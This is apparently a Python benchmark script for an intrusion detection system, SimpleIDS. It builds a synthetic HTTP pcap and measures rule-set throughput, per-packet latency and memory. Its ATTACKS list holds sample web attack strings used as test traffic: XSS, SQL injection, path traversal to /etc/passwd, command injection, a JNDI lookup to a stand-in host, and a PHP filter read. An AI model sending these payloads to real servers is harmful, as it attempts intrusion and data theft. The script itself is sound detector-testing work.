#!/usr/bin/env python3
"""
Benchmark (ROADMAP Phase 4 and 5): throughput with the full shipped rule
set (300 rules) must stay within 30% of a 10-rule set; then one more run
with --measure-latency reports the per-packet latency percentiles and the
peak resident memory, against the §3.3 targets (>= 500 Mbit/s single
thread, which depends on the machine and is only reported; memory well
under 256 MiB, which is checked).

A deterministic pcap of HTTP traffic is generated under build/bench/:
complete TCP connections (handshake, request, FIN) from many clients,
mostly ordinary page, API and form requests with realistic headers, and
about 2% attacks. SimpleIDS reads it with -l none -q, so the time is the
whole offline pipeline (pcap read, decode, flow, reassembly, HTTP
parsing, detection) without alert output. Each configuration runs
--runs times; the fastest run counts (the least disturbed by the host).

Usage: python3 tests/bench/bench.py [--bin ./SimpleIDS] [--requests N]
       [--runs N] [--max-drop 0.30] [--max-rss-mb 256]
Exit status 1 when the drop is at or above --max-drop, or the peak RSS is
above --max-rss-mb.
"""

import argparse
import os
import platform
import random
import re
import struct
import subprocess
import sys
import time
from urllib.parse import quote

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, os.path.join(ROOT, "tests", "regression"))
from gen_pcaps import SERVER, Conn  # noqa: E402

OUT = os.path.join(ROOT, "build", "bench")

WORDS = ("account settings search product news report video music travel weather sports "
         "garden kitchen phone laptop camera review price shipping order invoice support "
         "login profile cart checkout coupon blog docs api health status").split()
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "okhttp/4.12.0",
]
ATTACKS = [
    "/?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "/item?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
    "/download?file=../../../../etc/passwd",
    "/?cmd=;cat%20/etc/issue",
    "/?x=${jndi:ldap://x.example/a}",
    "/.git/config",
    "/?page=php://filter/convert.base64-encode/resource=index",
]


def request(rng, attack):
    if attack:
        target = rng.choice(ATTACKS)
    else:
        kind = rng.random()
        if kind < 0.35:
            target = "/" + "/".join(rng.choice(WORDS) for _ in range(rng.randint(1, 4)))
        elif kind < 0.6:
            target = f"/static/{rng.choice(WORDS)}.{rng.choice(['js', 'css', 'png', 'svg'])}" \
                     f"?v={rng.randint(1, 999)}"
        elif kind < 0.85:
            q = " ".join(rng.choice(WORDS) for _ in range(rng.randint(1, 5)))
            target = f"/search?q={quote(q)}&page={rng.randint(1, 20)}&sort=relevance"
        else:
            target = f"/api/v2/{rng.choice(WORDS)}/{rng.randint(1, 10**6)}?fields=id,name,updated"
    post = not attack and rng.random() < 0.15
    lines = [f"{'POST' if post else 'GET'} {target} HTTP/1.1",
             f"Host: www.{rng.choice(WORDS)}.example",
             f"User-Agent: {rng.choice(UAS)}",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7",
             "Accept-Encoding: gzip, deflate, br",
             f"Referer: https://www.{rng.choice(WORDS)}.example/{rng.choice(WORDS)}",
             f"Cookie: session={rng.getrandbits(128):032x}; theme=dark; lang=zh-TW"]
    body = b""
    if post:
        body = "&".join(f"{w}={quote(rng.choice(WORDS) + ' ' + rng.choice(WORDS))}"
                        for w in rng.sample(WORDS, 6)).encode()
        lines += ["Content-Type: application/x-www-form-urlencoded",
                  f"Content-Length: {len(body)}"]
    lines.append("Connection: close")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def build_pcap(path, n, seed=4):
    rng = random.Random(seed)
    t = 1_700_000_000.0
    size = 0
    with open(path, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        for i in range(n):
            client = f"10.{20 + i // 60000}.{i // 240 % 250}.{i % 240 + 2}"
            c = Conn(1024 + i % 60000, client=client, server=SERVER,
                     isn=rng.getrandbits(31), sisn=rng.getrandbits(31))
            req = request(rng, rng.random() < 0.02)
            for frame in c.handshake() + [c.data(0, req), c.fin(len(req))]:
                t += 0.0002
                sec = int(t)
                f.write(struct.pack("<IIII", sec, int((t - sec) * 1e6), len(frame), len(frame)))
                f.write(frame)
                size += len(frame)
    return size


def ten_rules(path):
    """The first ten HTTP request rules of the core set."""
    picked = []
    with open(os.path.join(ROOT, "rules", "http.rules")) as f:
        for line in f:
            if line.startswith("alert http") and "http.request_body" not in line:
                picked.append(line)
            if len(picked) == 10:
                break
    with open(path, "w") as f:
        f.writelines(picked)
    return len(picked)


def run_measured(args):
    """Run args; return (elapsed seconds, output, peak RSS in bytes)."""
    with open(os.devnull, "rb") as devnull:
        t0 = time.perf_counter()
        p = subprocess.Popen(args, cwd=ROOT, stdin=devnull, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True)
        output = p.stdout.read()
        _, status, ru = os.wait4(p.pid, 0)
        elapsed = time.perf_counter() - t0
    p.returncode = os.waitstatus_to_exitcode(status)
    if p.returncode != 0:
        sys.exit(f"SimpleIDS failed ({p.returncode}):\n{output}")
    rss = ru.ru_maxrss if platform.system() == "Darwin" else ru.ru_maxrss * 1024
    return elapsed, output, rss


def run(binary, pcap, rule_args):
    elapsed, output, _ = run_measured([binary, "-r", pcap, "-l", "none", "-q"] + rule_args)
    m = re.search(r"(\d+) rules", output)
    alerts = re.search(r"Signature alerts\s*:\s*(\d+)", output)
    return elapsed, int(m.group(1)) if m else 0, int(alerts.group(1)) if alerts else -1


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("--bin", default=os.path.join(ROOT, "SimpleIDS"))
    ap.add_argument("--requests", type=int, default=40000)
    ap.add_argument("--runs", type=int, default=5)
    ap.add_argument("--max-drop", type=float, default=0.30)
    ap.add_argument("--max-rss-mb", type=float, default=256)
    args = ap.parse_args()
    binary = os.path.abspath(args.bin)

    os.makedirs(OUT, exist_ok=True)
    pcap = os.path.join(OUT, f"http-{args.requests}.pcap")
    if not os.path.exists(pcap):
        print(f"Generating {pcap} ...")
        build_pcap(pcap, args.requests)
    nbytes = os.path.getsize(pcap)
    small = os.path.join(OUT, "rules10.rules")
    ten_rules(small)

    configs = [("10 rules", ["-R", small]), ("all rules", [])]
    results = {}
    for name, rule_args in configs:
        times = []
        for _ in range(args.runs):
            elapsed, nrules, alerts = run(binary, pcap, rule_args)
            times.append(elapsed)
        best = min(times)
        results[name] = best
        print(f"  {name:<10} {nrules:>4} rules  best {best * 1000:7.1f} ms  "
              f"{nbytes * 8 / best / 1e6:8.1f} Mbit/s  {args.requests / best:9.0f} req/s  "
              f"({alerts} alerts)")

    drop = 1 - results["10 rules"] / results["all rules"]
    ok = drop < args.max_drop
    print(f"  throughput drop: {drop * 100:.1f}% (limit {args.max_drop * 100:.0f}%) "
          f"{'ok' if ok else 'FAIL'}")

    # Latency and memory with every rule (one extra run; the clock reads
    # cost a little throughput, so this run is not part of the above).
    _, output, rss = run_measured([binary, "-r", pcap, "-l", "none", "-q", "--measure-latency"])
    lat = re.search(r"Latency per packet\s*:\s*avg (\d+) ns, p50 (\d+), p99 (\d+), "
                    r"p99\.9 (\d+), max (\d+) ns", output)
    if lat:
        avg, p50, p99, p999, mx = (int(x) for x in lat.groups())
        print(f"  latency per packet (all rules): avg {avg} ns, p50 {p50} ns, p99 {p99} ns, "
              f"p99.9 {p999} ns, max {mx / 1000:.1f} us")
    else:
        print("  latency: not reported")
        ok = False
    mbps = nbytes * 8 / results["all rules"] / 1e6
    rss_ok = rss <= args.max_rss_mb * 1024 * 1024
    print(f"  peak RSS (all rules): {rss / 1048576:.1f} MiB (limit {args.max_rss_mb:.0f} MiB) "
          f"{'ok' if rss_ok else 'FAIL'}")
    print(f"  target >= 500 Mbit/s single thread: {mbps:.0f} Mbit/s "
          f"{'met' if mbps >= 500 else 'not met on this machine'} (informational)")
    return 0 if ok and rss_ok else 1


if __name__ == "__main__":
    sys.exit(main())
